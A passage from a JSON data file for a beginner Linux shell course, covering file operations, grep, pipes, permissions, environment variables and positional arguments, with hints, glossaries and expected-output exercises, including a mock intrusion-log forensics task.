remain.\n\n## Predict & Observe\n\nWhat would happen if you ran ^mv draft.txt archive/^? The file ^draft.txt^ would be moved *inside* the ^archive^ directory! When the target is an existing folder, ^mv^ places the file inside it.\n\n## Your Task\n\nWrite a script in ^script.sh^ that:\n1. Enters the ^lab^ directory using ^cd lab^.\n2. Clones ^draft.txt^ to ^copy.txt^ using ^cp draft.txt copy.txt^.\n3. Renames ^draft.txt^ to ^final.txt^ using ^mv draft.txt final.txt^.\n4. Deletes ^copy.txt^ using ^rm copy.txt^.\n5. Lists the folder contents using ^ls^.","starter":"# File Operations Lesson 2.2: cp, mv, and rm\n# Enter lab, copy draft.txt, rename draft to final, and remove copy\n\n","hint":"Navigate with \"cd lab\", then \"cp draft.txt copy.txt\", \"mv draft.txt final.txt\", \"rm copy.txt\", and \"ls\".","terms":[{"term":"cp","def":"Copy: duplicates files or directories from a source to a destination."},{"term":"mv","def":"Move: moves a file to another directory or renames it in place."},{"term":"rm","def":"Remove: permanently deletes files from disk without a recycling bin."},{"term":"recursive","def":"Operating on a directory and all files and subdirectories inside it."}],"image":{"url":"/diagrams/linux/cp-mv-rm.svg","caption":"File Operations: cp duplicates, mv moves or renames, rm permanently deletes"},"isUnitTest":false,"fileName":"script.sh","tests":[{"name":"Perform copy, rename, and delete in lab directory","input":"","expected":"archive\nfinal.txt"}],"usesInput":false,"hasHarness":false},{"id":"grep-search","number":"2.3","title":"Finding the Needle: grep","content":"## Concept Hook: Where's Waldo in 100,000 Lines\n\nImagine being handed a 500-page telephone directory and tasked with finding every person whose last name is \"Wayne\". Flipping through every single page with your eyes would take hours.\n\nIn Linux, **grep** is your optical scanner. You give it a target word, and it scans through millions of lines of text in milliseconds, printing out only the exact lines that contain your search term.\n\n## Plain English: How grep Works\n\n^grep^ stands for **Global Regular Expression Print**. It searches input files line by line for a specific pattern of text.\n\nKey flags make ^grep^ infinitely flexible:\n- ^-i^ stands for **ignore case**. It matches \"error\", \"ERROR\", and \"Error\" equally.\n- ^-c^ stands for **count**. Instead of printing the matching lines, it prints the single number of how many times the term appeared.\n- ^-n^ shows the line number where each match occurred.\n- ^-v^ inverts the search, printing every line that DOES NOT match.\n\n## Pop Culture & Soul\n\nWhether you're Sherlock Holmes investigating clues in a Victorian ledger or Morpheus searching the Matrix for anomaly signatures, ^grep^ is the most famous and beloved search utility in computing history.\n\n## Code Walkthrough\n\n~~~\n# Find all error lines regardless of capitalization\ngrep -i \"error\" server.log\n\n# Count how many lines mention database\ngrep -c -i \"database\" server.log\n~~~\n\n- Line 2: ^grep -i \"error\"^ prints the three error messages (both uppercase ^[ERROR]^ and lowercase ^[error]^).\n- Line 5: ^grep -c -i \"database\"^ outputs ^2^ because two lines contain the word \"database\".\n\n## Predict & Observe\n\nWhat would happen if you ran ^grep \"error\" server.log^ without the ^-i^ flag? It would only match the single lowercase ^[error]^ line and completely miss the two uppercase ^[ERROR]^ lines! Always use ^-i^ when case might vary.\n\n## Your Task\n\nWrite a script in ^script.sh^ that:\n1. Searches ^server.log^ for all lines containing ^\"error\"^ with case-insensitivity using ^grep -i \"error\" server.log^.\n2. Counts how many lines mention ^\"database\"^ with case-insensitivity using ^grep -c -i \"database\" server.log^.","starter":"# File Operations Lesson 2.3: grep\n# Search server.log for errors and count database mentions\n\n","hint":"Run \"grep -i \\\"error\\\" server.log\" and \"grep -c -i \\\"database\\\" server.log\".","terms":[{"term":"grep","def":"Global Regular Expression Print: searches text line by line for matching patterns."},{"term":"pattern","def":"The text string or regular expression you are searching for."},{"term":"-i","def":"Grep flag for case-insensitive matching (ignores uppercase vs lowercase)."},{"term":"-c","def":"Grep flag that outputs only the count of matching lines instead of the text."}],"image":{"url":"/diagrams/linux/grep-search.svg","caption":"Text Search: grep filters lines matching a pattern with flags like -i and -c"},"isUnitTest":false,"fileName":"script.sh","tests":[{"name":"Extract error lines and count database occurrences","input":"","expected":"[ERROR] 10:01:23 Database connection timed out\n[error] 10:03:45 Socket read error on port 8080\n[ERROR] 10:05:59 Authentication failed for user root\n2"}],"usesInput":false,"hasHarness":false},{"id":"unit-2-test","number":"2.4","title":"Unit 2 Test: Server Intrusion Log Investigator","content":"## The Mission: Zion Mainframe Intrusion\n\n**Alert from Cyber Defense Operations:**\n\n*\"An unauthorized IP address has attempted a brute-force breach against our core authentication gateway! Agent Smith's bots are scanning our ports. We need a security engineer to isolate the forensic evidence, extract the failed logins, and inspect the final lockdown entries!\"*\n\nYou are the Incident Response Lead. Demonstrate your file manipulation and text inspection skills.\n\n## The Specification\n\nWrite an automated investigation script in ^script.sh^ that executes the following protocol:\n\n1. Extract all failed login attempts from ^auth.log^ with case-insensitivity using ^grep -i \"failed\" auth.log^.\n2. Create an isolated evidence directory ^quarantine^ using ^mkdir -p quarantine^.\n3. Make a forensic backup copy of ^auth.log^ named ^quarantine/auth_backup.log^ using ^cp^.\n4. Move the raw memory dump ^temp_dump.txt^ into ^quarantine/temp_evidence.log^ using ^mv^.\n5. Inspect the final 2 lines of ^auth.log^ using ^tail -n 2 auth.log^ to confirm the lockdown status.\n\n## Expected Output\n\nYour script must produce the following output:\n\n~~~\nJun 10 04:02:45 host sshd[1205]: FAILED password for invalid user root from 192.168.1.100\nJun 10 04:04:22 host sshd[1212]: FAILED password for morpheus from 10.0.0.55\nJun 10 04:05:01 host sshd[1215]: failed login attempt detected from 172.16.0.4\nJun 10 04:05:01 host sshd[1215]: failed login attempt detected from 172.16.0.4\nJun 10 04:06:18 host sshd[1220]: System lockdown triggered by security daemon\n~~~\n\nSecure the mainframe, Detective!","starter":"# Unit 2 Test: Server Intrusion Log Investigator\n# Grep failed attempts, quarantine evidence, and tail final status\n\n","hint":"Use \"grep -i \\\"failed\\\" auth.log\", \"mkdir -p quarantine\", \"cp auth.log quarantine/auth_backup.log\", \"mv temp_dump.txt quarantine/temp_evidence.log\", and \"tail -n 2 auth.log\".","terms":[{"term":"forensics","def":"The practice of collecting, analyzing, and preserving digital evidence from logs and files."},{"term":"quarantine","def":"An isolated directory where suspicious or compromised files are moved for safe analysis."}],"image":{"url":"/diagrams/linux/unit-2-test.svg","caption":"Unit 2 Test: Forensic analysis of server intrusion logs and quarantine isolation"},"isUnitTest":true,"fileName":"script.sh","tests":[{"name":"Perform forensic investigation of auth.log","input":"","expected":"Jun 10 04:02:45 host sshd[1205]: FAILED password for invalid user root from 192.168.1.100\nJun 10 04:04:22 host sshd[1212]: FAILED password for morpheus from 10.0.0.55\nJun 10 04:05:01 host sshd[1215]: failed login attempt detected from 172.16.0.4\nJun 10 04:05:01 host sshd[1215]: failed login attempt detected from 172.16.0.4\nJun 10 04:06:18 host sshd[1220]: System lockdown triggered by security daemon"}],"usesInput":false,"hasHarness":false}]},{"id":"streams-pipes","title":"Streams, Redirection & Pipes","lessons":[{"id":"stdout-redirection","number":"3.1","title":"Directing the Flow: > and >>","content":"## Concept Hook: Ghostbusters & Plumbing Valves\n\nIn *Ghostbusters*, when Peter Venkman fires his proton wand, the energy stream flies freely forward through the air. But when he points the beam downward directly into the ghost trap, he **redirects** the stream into a storage container.\n\nIn Linux, every command you execute writes its answers to a default river called **Standard Output** (^stdout^), which flows right onto your screen. But you can screw a nozzle onto that stream and redirect it into a file using the angle brackets: ^>^ (overwrite) and ^>>^ (append).\n\n## Plain English: Overwrite vs Append\n\n- Standard Output (^stdout^) is where programs send their normal output text.\n- Single bracket ^>^ is the **overwrite** operator. It directs the output into a file. If the file already exists, it is wiped clean to 0 bytes before writing new text!\n- Double bracket ^>>^ is the **append** operator. It directs the output to the file without erasing anything, attaching the new lines neatly to the bottom.\n\n## Pop Culture & Soul\n\nImagine a diary or spaceship flight recorder. If you use ^>^ every morning, today's entry erases yesterday's history! That's why log files always use ^>>^ to preserve the continuous journal of events.\n\n## Code Walkthrough\n\n~~~\n# 1. Overwrite status.txt with the first entry\necho \"System Online\" > status.txt\n\n# 2. Append the second status entry\necho \"Sensors Nominal\" >> status.txt\n\n# 3. Append the third status entry\necho \"Shields 100%\" >> status.txt\n\n# 4. Display the resulting file\ncat status.txt\n~~~\n\n- Line 2: Creates or resets ^status.txt^ containing \"System Online\".\n- Lines 5 & 8: ^>>^ appends \"Sensors Nominal\" and \"Shields 100%\" below it.\n- Line 11: ^cat status.txt^ prints all three lines.\n\n## Predict & Observe\n\nWhat would happen if on Line 8 you mistakenly used ^>^ instead of ^>>^? The entire file would be wiped, leaving only \"Shields 100%\" inside! Always double-check whether you want to clobber (^>^) or append (^>>^).\n\n## Your Task\n\nWrite a script in ^script.sh^ that:\n1. Writes ^\"System Online\"^ into ^status.txt^ using ^>^.\n2. Appends ^\"Sensors Nominal\"^ to ^status.txt^ using ^>>^.\n3. Appends ^\"Shields 100%\"^ to ^status.txt^ using ^>>^.\n4. Outputs the file contents using ^cat status.txt^.","starter":"# Streams Lesson 3.1: > and >>\n# Build status.txt with overwrite and append, then cat\n\n","hint":"Use \"echo \\\"System Online\\\" > status.txt\", then append two lines with \">>\", then \"cat status.txt\".","terms":[{"term":"stdout","def":"Standard Output: the default text stream where programs send output messages."},{"term":"redirection","def":"Diverting an input or output stream to or from a file instead of the terminal."},{"term":">","def":"Output redirection operator that overwrites the destination file."},{"term":">>","def":"Output redirection operator that appends to the end of the destination file."},{"term":"echo","def":"Command that prints text strings to standard output."}],"image":{"url":"/diagrams/linux/stdout-redirection.svg","caption":"Redirection Operators: > overwrites existing content, >> appends new lines"},"isUnitTest":false,"fileName":"script.sh","tests":[{"name":"Redirect and append status updates","input":"","expected":"System Online\nSensors Nominal\nShields 100%"}],"usesInput":false,"hasHarness":false},{"id":"pipes-basics","number":"3.2","title":"Assembly Lines: The Pipe |","content":"## Concept Hook: The Willy Wonka Chocolate Assembly Line\n\nIn Willy Wonka's chocolate factory, you don't take warm liquid chocolate out of the mixing vat, pour it into a bucket, carry it across the room, dump it onto a cooling slab, pick it up again, and hand it to a packaging machine.\n\nThe machines are connected directly by overhead pipes! The output of the mixer flows directly into the cooling chamber, which flows into the wrapper.\n\nThe vertical bar **pipe** ^|^ is the most celebrated invention in Unix history. It connects the **standard output** of one command directly into the **standard input** of the next command in memory without saving intermediate files to disk!\n\n## Plain English: How the Pipe Works\n\nThe Linux philosophy states:\n> *\"Write programs that do one thing and do it well. Write programs to work together.\"*\n\nInstead of creating one giant bloated program that searches, sorts, and counts, Linux gives you small, razor-sharp tools:\n- ^grep^ searches.\n- ^wc -l^ counts lines.\n- The pipe ^|^ connects them: ^grep \"First Class\" passengers.txt | wc -l^ filters the passengers and counts them in one smooth breath.\n\n## Pop Culture & Soul\n\nInvented by Doug McIlroy at Bell Labs in the 1970s, the pipe transformed computing. Think of it like connecting Lego blocks: with small building bricks and the pipe connector, you can assemble infinite data-processing machines.\n\n## Code Walkthrough\n\n~~~\n# Filter First Class passengers and count how many rows match\ngrep \"First Class\" passengers.txt | wc -l\n\n# Count total lines in the passenger roster\ncat passengers.txt | wc -l\n~~~\n\n- Line 2: ^grep^ extracts the 6 matching First Class lines; the pipe ^|^ feeds them into ^wc -l^ which outputs ^6^.\n- Line 5: ^cat^ streams all 9 lines into ^wc -l^ which outputs ^9^.\n\n## Predict & Observe\n\nNotice that no temporary text file was ever created on your hard drive! The data flowed through a high-speed memory pipe.\n\n## Your Task\n\nWrite a script in ^script.sh^ that:\n1. Counts the number of passengers with \"First Class\" tickets by piping ^grep \"First Class\" passengers.txt^ into ^wc -l^.\n2. Counts the total number of passenger records by piping ^cat passengers.txt^ into ^wc -l^.","starter":"# Streams Lesson 3.2: The Pipe |\n# Pipe grep into wc -l, and cat into wc -l\n\n","hint":"Run \"grep \\\"First Class\\\" passengers.txt | wc -l\" and \"cat passengers.txt | wc -l\".","terms":[{"term":"pipe (|)","def":"The Unix pipe operator that routes stdout from one command directly into stdin of another."},{"term":"stdin","def":"Standard Input: the stream where a command reads its incoming input data."},{"term":"wc","def":"Word Count: utility to count lines (-l), words (-w), or bytes (-c)."},{"term":"pipeline","def":"A chain of two or more commands linked together with pipe (|) operators."}],"image":{"url":"/diagrams/linux/pipes-basics.svg","caption":"The Unix Pipeline: Connecting command stdout directly to stdin via pipe |"},"isUnitTest":false,"fileName":"script.sh","tests":[{"name":"Count filtered and total passengers via pipe","input":"","expected":"6\n9"}],"usesInput":false,"hasHarness":false},{"id":"sort-uniq","number":"3.3","title":"Clean and Tidy: sort and uniq","content":"## Concept Hook: The Hogwarts Sorting Hat\n\nImagine being handed a box of thousands of movie ballots from an Oscars poll. If you try to count how many votes \"The Matrix\" received while pulling names at random, you will constantly lose count.\n\nFirst, you sort all ballots alphabetically into stacks (^sort^). Once all identical names sit side by side, counting and deduplicating becomes effortless (^uniq^).\n\n## Plain English: Mastering sort and uniq\n\n- ^sort^ organizes lines in alphabetical (or numerical) order.\n- ^uniq^ detects and removes consecutive duplicate lines.\n- **The Golden Rule of uniq:** ^uniq^ ONLY compares adjacent lines! If \"Inception\" appears on line 1 and line 7, ^uniq^ will NOT see the duplicate. You must ALWAYS sort your data before piping into ^uniq^: ^sort votes.txt | uniq^!\n- The ^-c^ flag tells ^uniq -c^ to print a count prefix showing how many times each unique item occurred.\n\n## Pop Culture & Soul\n\nEvery time Spotify generates your *Spotify Wrapped* or billboard charts tally top songs, data pipelines sort stream logs and aggregate frequency counts. You are learning the exact pipeline primitives that drive big data analytics.\n\n## Code Walkthrough\n\n~~~\n# 1. Output unique movie titles in alphabetical order\nsort votes.txt | uniq\n\n# 2. Count the frequency of each movie vote\nsort votes.txt | uniq -c\n~~~\n\n- Line 2: Sorts the list and removes duplicates, outputting: ^Inception^, ^Interstellar^, ^The Matrix^.\n- Line 5: ^uniq -c^ counts how many times each title occurred in the sorted stream.\n\n## Predict & Observe\n\nWhat would happen if you ran ^uniq votes.txt^ without sorting first? None of the duplicate votes would be merged, because identical movie names were separated by other titles! Always sort first.\n\n## Your Task\n\nWrite a script in ^script.sh^ that:\n1. Prints the unique list of movies sorted alphabetically using ^sort votes.txt | uniq^.\n2. Prints the counted vote tally for each unique movie using ^sort votes.txt | uniq -c^.","starter":"# Streams Lesson 3.3: sort and uniq\n# Sort and deduplicate votes.txt, then count occurrences\n\n","hint":"Run \"sort votes.txt | uniq\" followed by \"sort votes.txt | uniq -c\".","terms":[{"term":"sort","def":"Sorts lines of text files alphabetically or numerically."},{"term":"uniq","def":"Reports or omits repeated lines; requires adjacent sorted input."},{"term":"uniq -c","def":"Prefixes lines by the number of occurrences."},{"term":"aggregation","def":"Combining multiple data rows into summary counts or statistics."}],"image":{"url":"/diagrams/linux/sort-uniq.svg","caption":"Deduplication Pipeline: Always sort before uniq to group adjacent duplicates"},"isUnitTest":false,"fileName":"script.sh","tests":[{"name":"Sort and deduplicate movie votes","input":"","expected":"Inception\nInterstellar\nThe Matrix\n      3 Inception\n      2 Interstellar\n      3 The Matrix"}],"usesInput":false,"hasHarness":false},{"id":"unit-3-test","number":"3.4","title":"Unit 3 Test: Music Streaming Top 10 Chart Aggregator","content":"## The Mission: Billboard & Spotify Stream Tally\n\n**Emergency Memo from Spotify Data Engineering:**\n\n*\"The weekly Global Top Chart closes in five minutes! Millions of raw streaming events have poured into ^streams.log^. However, quality assurance engineers left ^TEST_STREAM^ probe records scattered throughout the log. We need an automated analytics pipeline to filter out the test data, calculate play counts, rank the top 3 songs, and publish the chart!\"*\n\nYou are the Lead Data Infrastructure Engineer. Prove your mastery of Linux pipelines and stream redirection.\n\n## The Specification\n\nWrite an automated multi-stage pipeline script in ^script.sh^ that:\n\n1. Filters out any lines matching ^\"TEST_STREAM\"^ using ^grep -v \"TEST_STREAM\" streams.log^.\n2. Pipes into ^sort^ to group identical track names together.\n3. Pipes into ^uniq -c^ to count the number of plays for each track.\n4. Pipes into ^sort -nr^ (numerical reverse sort) so the track with the highest play count appears first.\n5. Grabs only the top 3 leaderboard tracks using ^head -n 3^.\n6. Redirects that output into a new file named ^top3.txt^ using ^>^.\n7. Prints ^top3.txt^ to the terminal using ^cat top3.txt^.\n\n## Expected Output\n\nYour script must produce the following leaderboard:\n\n~~~\n      4 Daft Punk - One More Time\n      3 Queen - Bohemian Rhapsody\n      2 Fleetwood Mac - Dreams\n~~~\n\nPublish the chart to millions of listeners worldwide!","starter":"# Unit 3 Test: Music Streaming Top 10 Chart Aggregator\n# Filter TEST_STREAM, sort, uniq -c, sort -nr, head -n 3 > top3.txt, then cat\n\n","hint":"Chain the commands together with | into \"> top3.txt\", then call \"cat top3.txt\".","terms":[{"term":"grep -v","def":"Inverted grep: selects lines that DO NOT match the search pattern."},{"term":"sort -nr","def":"Sorts numerically (-n) in reverse descending order (-r)."},{"term":"data pipeline","def":"A sequence of data-processing stages connected in series."}],"image":{"url":"/diagrams/linux/unit-3-test.svg","caption":"Unit 3 Test: Multi-stage streaming pipeline to aggregate Billboard Top 3"},"isUnitTest":true,"fileName":"script.sh","tests":[{"name":"Generate and display top 3 streaming leaderboard","input":"","expected":"      4 Daft Punk - One More Time\n      3 Queen - Bohemian Rhapsody\n      2 Fleetwood Mac - Dreams"}],"usesInput":false,"hasHarness":false}]},{"id":"permissions-env","title":"Permissions & Environment Variables","lessons":[{"id":"file-permissions","number":"4.1","title":"The Security Gate: Understanding rwx","content":"## Concept Hook: VIP Concert Passes\n\nAt a stadium concert, not everyone has the same level of access:\n- Fans with standard tickets sit in the stands (**Read** access: you can watch the show).\n- The sound engineers have backstage passes (**Write** access: they can plug in cables and modify equipment).\n- The lead guitarist has stage access (**Execute** access: they can run out and perform).\n\nLinux is a multi-user operating system designed from day one to protect files from unauthorized access. Every single file has three rings of permissions: **User** (the owner), **Group** (teammates), and **Others** (the rest of the world).\n\n## Plain English: Decoding -rwxr-xr--\n\nWhen you inspect a file with ^ls -l^, the first column shows a 10-character code like ^-rwxr-xr--^:\n- Character 1: File type (^^-^^ for normal file, ^^d^^ for directory).\n- Characters 2-4: **User (Owner)** permissions (^rwx^ = can read, write, and execute).\n- Characters 5-7: **Group** permissions (^r-x^ = can read and execute, but cannot write).\n- Characters 8-10: **Others** permissions (^r--^ = can only read).\n\nThe three basic permissions are:\n- **r** (Read): View the file's contents.\n- **w** (Write): Modify, edit, or delete the file.\n- **x** (Execute): Run the file as a program or script.\n\n## Pop Culture & Soul\n\nIn *Harry Potter*, the Hogwarts library has a \"Restricted Section\" behind a locked rope. Students have read permissions in the general stacks, but only professors have execute and write permissions in the restricted wing. Permissions protect computers from accidents and hackers alike.\n\n## Code Walkthrough\n\n~~~\n# Set standard permissions: public read-only (644), secret owner-only (600)\nchmod 644 public_notes.txt\nchmod 600 secret_vault.sh\n\n# Display only the permission mask column\nls -l public_notes.txt | awk '{print $1}'\nls -l secret_vault.sh | awk '{print $1}'\n~~~\n\n- Lines 2-3: Standardizes the permission masks.\n- Lines 6-7: Prints ^-rw-r--r--^ (public document) and ^-rw-------^ (locked vault file).\n\n## Predict & Observe\n\nWhat does the dash ^-^ mean in a permission slot like ^r-x^? It means that particular privilege is revoked! In ^r-x^, the write permission is absent.\n\n## Your Task\n\nWrite a script in ^script.sh^ that:\n1. Sets permissions on ^public_notes.txt^ to 644 using ^chmod 644 public_notes.txt^.\n2. Sets permissions on ^secret_vault.sh^ to 600 using ^chmod 600 secret_vault.sh^.\n3. Prints the permission string of ^public_notes.txt^ with ^ls -l public_notes.txt | awk '{print $1}'^.\n4. Prints the permission string of ^secret_vault.sh^ with ^ls -l secret_vault.sh | awk '{print $1}'^.","starter":"# Permissions Lesson 4.1: Understanding rwx\n# Set permissions and inspect the permission columns\n\n","hint":"Apply chmod 644 and chmod 600, then display column 1 using awk with ls -l.","terms":[{"term":"permissions","def":"Security rules defining who can read (r), write (w), or execute (x) a file."},{"term":"user (u)","def":"The user account that owns the file."},{"term":"group (g)","def":"A collection of users with shared access to specific files."},{"term":"others (o)","def":"All other users on the operating system."},{"term":"rwx","def":"Read (4), Write (2), Execute (1) access rights."}],"image":{"url":"/diagrams/linux/file-permissions.svg","caption":"Linux Permissions: rwx triad breakdown for User, Group, and Others"},"isUnitTest":false,"fileName":"script.sh","tests":[{"name":"Inspect decoded permission strings","input":"","expected":"-rw-r--r--\n-rw-------"}],"usesInput":false,"hasHarness":false},{"id":"chmod-basics","number":"4.2","title":"Changing Rights: chmod","content":"## Concept Hook: Gandalf on the Bridge\n\nIn *The Lord of the Rings*, Gandalf slams his staff on the stone bridge of Khazad-dûm and roars: *\"You shall not pass!\"*\n\nWhen you write a brand-new script in Linux, the operating system intentionally creates it without execute rights. If you try to run it with ^./launch_rocket.sh^, Linux stops you cold: *Permission denied*. Linux does this to protect you from accidentally running downloaded scripts that might harm your machine.\n\nTo grant execution rights, you act as the wizard with the **chmod** command.\n\n## Plain English: How chmod Works\n\n^chmod^ stands for **Change Mode**. It changes the access permissions of files and folders.\n\nThere are two popular ways to use ^chmod^:\n1. **Symbolic Mode**: Quick switches like ^chmod +x filename^. The ^+x^ simply adds the execute bit for everyone.\n2. **Octal Numbers Mode**: Three numbers representing User, Group, and Others (where Read = 4, Write = 2, Execute = 1):\n   - ^755^ = ^rwxr-xr-x^ (Owner can do everything; teammates and others can read & execute). Ideal for scripts!\n   - ^644^ = ^rw-r--r--^ (Owner can read/write; others can read). Standard for text documents.\n   - ^600^ = ^rw-------^ (Owner can read/write; no one else can touch). Used for private SSH keys and passwords.\n\n## Pop Culture & Soul\n\nEvery Linux programmer remembers the first time they wrote a shell script and got hit with *Permission denied*. Typing ^chmod +x script.sh^ is like turning the ignition key in a sports car: suddenly the engine roars to life.\n\n## Code Walkthrough\n\n~~~\n# 1. Grant execute rights to the launch script\nchmod +x launch_rocket.sh\n\n# 2. Fire the script!\n./launch_rocket.sh\n~~~\n\n- Line 2: ^chmod +x launch_rocket.sh^ flips the execute flag on.\n- Line 5: ^./launch_rocket.sh^ executes the script, outputting: \"Rocket launched into orbit!\"\n\n## Predict & Observe\n\nWhat does the leading ^./^ mean when running ^./launch_rocket.sh^? It explicitly tells Linux: *\"Look in the current directory (^.^) for this script.\"* For security reasons, Linux never runs programs in your current directory unless you prefix them with ^./^.\n\n## Your Task\n\nWrite a script in ^script.sh^ that:\n1. Makes ^launch_rocket.sh^ executable using ^chmod +x launch_rocket.sh^.\n2. Executes it using ^./launch_rocket.sh^.","starter":"# Permissions Lesson 4.2: chmod\n# Grant execute rights to launch_rocket.sh and run it\n\n","hint":"Type \"chmod +x launch_rocket.sh\" followed by \"./launch_rocket.sh\".","terms":[{"term":"chmod","def":"Change Mode: command used to modify file and directory read/write/execute permissions."},{"term":"chmod +x","def":"Adds execute permission to a file so it can be run as a program."},{"term":"755","def":"Octal permission: User=rwx (7), Group=r-x (5), Others=r-x (5)."},{"term":"./","def":"Prefix telling the shell to execute a program located in the current directory."}],"image":{"url":"/diagrams/linux/chmod-basics.svg","caption":"Modifying Access: chmod +x enables execution, octal 755 sets standard rights"},"isUnitTest":false,"fileName":"script.sh","tests":[{"name":"Enable execution and launch rocket","input":"","expected":"Rocket launched into orbit!"}],"usesInput":false,"hasHarness":false},{"id":"env-variables","number":"4.3","title":"Terminal Memory: Environment Variables","content":"## Concept Hook: JARVIS & Iron Man Suit State\n\nIn Marvel's *Iron Man*, Tony Stark steps into his workshop and asks: *\"JARVIS, what is our current power level?\"* JARVIS instantly checks the global system diagnostics and responds with suit telemetry.\n\nIn Linux, **environment variables** act as the global memory of your terminal session. They hold essential facts about who you are (^$USER^), where your home is located (^$HOME^), and which directories contain runnable software (^$PATH^).\n\n## Plain English: Variables and export\n\nA **variable** is a named container that holds a value.\n- To create a variable in bash, type its name followed immediately by an equals sign and value: ^HERO=\"Tony Stark\"^. **Crucial rule:** In bash, you must NEVER put spaces around the ^=^ sign!\n- To read the value back, prefix the name with a dollar sign: ^echo $HERO^.\n- Normally, a variable only lives inside the current shell. If that shell runs another script, the child script won't know the variable exists. The ^export^ command promotes the variable to global status, sharing it with all child programs and scripts!\n\n## Pop Culture & Soul\n\nEvery modern web app, cloud deployment, and game engine relies on environment variables for API keys and database passwords. When Netflix or NASA deploys code, they don't hardcode passwords; they inject them through exported environment variables.\n\n## Code Walkthrough\n\n~~~\n# Define and export environment variables\nexport HERO=\"Tony Stark\"\nexport SUIT=\"Mark 85\"\n\n# Print the formatted output using variable interpolation\necho \"Hero: $HERO | Armor: $SUIT\"\n~~~\n\n- Lines 2 & 3: Creates and exports ^HERO^ and ^SUIT^ into the shell environment.\n- Line 6: ^$HERO^ and ^$SUIT^ expand to their stored text values.\n\n## Predict & Observe\n\nWhat would happen if you wrote ^HERO = \"Tony Stark\"^ with spaces around the equals sign? Bash would try to execute a program named ^HERO^ with arguments ^=^ and ^\"Tony Stark\"^, resulting in an error! Remember: zero spaces around ^=^.\n\n## Your Task\n\nWrite a script in ^script.sh^ that:\n1. Exports an environment variable named ^HERO^ set to ^\"Tony Stark\"^.\n2. Exports an environment variable named ^SUIT^ set to ^\"Mark 85\"^.\n3. Prints the exact string: ^Hero: $HERO | Armor: $SUIT^ using ^echo^.","starter":"# Permissions Lesson 4.3: Environment Variables\n# Export HERO and SUIT, then print them\n\n","hint":"Remember: no spaces around \"=\" when assigning variables! Use export HERO=\"...\" and echo.","terms":[{"term":"variable","def":"A named storage location in memory holding a text string or number."},{"term":"$ (dollar sign)","def":"Prefix operator used in bash to read or expand the value of a variable."},{"term":"export","def":"Marks an environment variable to be exported to child processes and scripts."},{"term":"$PATH","def":"A colon-separated list of directories where Linux looks for executable commands."}],"image":{"url":"/diagrams/linux/env-variables.svg","caption":"Global State: Environment variables store global system configuration"},"isUnitTest":false,"fileName":"script.sh","tests":[{"name":"Export variables and print formatted string","input":"","expected":"Hero: Tony Stark | Armor: Mark 85"}],"usesInput":false,"hasHarness":false},{"id":"unit-4-test","number":"4.4","title":"Unit 4 Test: Secure Vault Script Deployment","content":"## The Mission: Langley CIA Vault Hardening\n\n**Top Secret Dispatch from Mission Commander:**\n\n*\"Our automated deployment pipeline is preparing to spin up the secure intelligence vault. However, the private encryption key ^deploy/id_rsa^ currently has insecure permissions. If SSH detects key permissions that are open to other users, it will refuse to connect! Furthermore, the deployment runner script needs execution rights and production environment variables.\"*\n\nYou are the Lead DevSecOps Engineer. Secure the keys, configure the runtime environment, and launch the vault!\n\n## The Specification\n\nWrite an automated deployment hardening script in ^script.sh^ that:\n\n1. Locks down the private key ^deploy/id_rsa^ so only the owner can read and write it (^chmod 600 deploy/id_rsa^).\n2. Grants read, write, and execute permissions to the owner, and read and execute to others on ^deploy/run_vault.sh^ (^chmod 755 deploy/run_vault.sh^).\n3. Sets and exports the environment variable ^VAULT_ENV=\"production\"^.\n4. Sets and exports the environment variable ^VAULT_PORT=\"8443\"^.\n5. Executes the vault launcher: ^./deploy/run_vault.sh^.\n6. Verifies the hardened permissions of ^deploy/id_rsa^ by printing column 1 of ^ls -l^:\n   ^ls -l deploy/id_rsa | awk '{print $1}'^.\n\n## Expected Output\n\nYour script must produce the following deployment output:\n\n~~~\nproduction ready on port 8443\n-rw-------\n~~~\n\nDeploy the vault and secure the intelligence network!","starter":"# Unit 4 Test: Secure Vault Script Deployment\n# Harden id_rsa (600), enable run_vault.sh (755), export env vars, execute, and verify\n\n","hint":"Apply chmod 600 to id_rsa, chmod 755 to run_vault.sh, export VAULT_ENV and VAULT_PORT, run ./deploy/run_vault.sh, then check permissions with awk.","terms":[{"term":"devsecops","def":"Development, Security, and Operations: integrating security practices into automation."},{"term":"600","def":"Octal permission: User read/write (rw-------); required for private keys."},{"term":"interpolation","def":"Substituting variable names with their values inside strings (e.g. $VAULT_ENV)."}],"image":{"url":"/diagrams/linux/unit-4-test.svg","caption":"Unit 4 Test: Hardening SSH key permissions and deploying vault services"},"isUnitTest":true,"fileName":"script.sh","tests":[{"name":"Harden permissions and execute vault deployment","input":"","expected":"production ready on port 8443\n-rw-------"}],"usesInput":false,"hasHarness":false}]},{"id":"scripting-automation","title":"Bash Scripting & Automation (Capstone)","lessons":[{"id":"bash-args","number":"5.1","title":"Passing Parameters: Positional Arguments $1, $2, $#","content":"## Concept Hook: The Doctor's TARDIS Coordinates\n\nIn *Doctor Who*, whenever the Doctor steps up to the TARDIS flight console, they don't rebuild the ship from scratch for every journey. They dial in variable coordinates: **Destination Planet**, **Time Period**, and **Dimension**. The TARDIS takes those inputs and propels the vessel into the time vortex.\n\nIn Bash scripts, **positional arguments** allow your scripts to become reusable automated machines. Instead of hardcoding values inside your code, you pass parameters when running the command:\n^./travel.sh \"Gallifrey\" \"2026\"^\n\n## Plain English: How Positional Arguments Work\n\nWhen a bash script or function is executed with words after its name, bash automatically assigns each word to a numbered variable:\n- ^$0^ is the name of the script itself.\n- ^$1^ is the **first argument** passed.\n- ^$2^ is the **second argument** passed.\n- ^$3^, ^$4^, etc., capture further arguments.\n- ^$#^ is the **count** of how many total arguments were supplied.\n- ^$@^ represents all arguments together as a list.\n\nIn bash, you can also use the ^set --^ command to simulate or assign positional arguments directly inside a script!\n\n## Pop Culture & Soul\n\nImagine an undercover spy network like the Avengers or the Kingsman. When an agent reports in, you don't rewrite headquarters software; you pass their assigned role and codename as parameters:\n^Agent count: 2^\n^Welcome, Agent Falcon! Assigned role: Recon.^\n\n## Code Walkthrough\n\n~~~\n# Set the first mission parameters: $1=\"Recon\", $2=\"Falcon\"\nset -- \"Recon\" \"Falcon\"\necho \"Agent count: $#\"\necho \"Welcome, Agent $2! Assigned role: $1.\"\n\n# Reassign for a second mission: $1=\"Infiltration\", $2=\"Shadow\"\nset -- \"Infiltration\" \"Shadow\"\necho \"Agent count: $#\"\necho \"Welcome, Agent $2! Assigned role: $1.\"\n~~~\n\n- Lines 2 & 7: ^set --^ sets the positional parameters ^$1^ and ^$2^.\n- Lines 3 & 8: ^$#^ evaluates to ^2^ (two arguments passed).\n- Lines 4 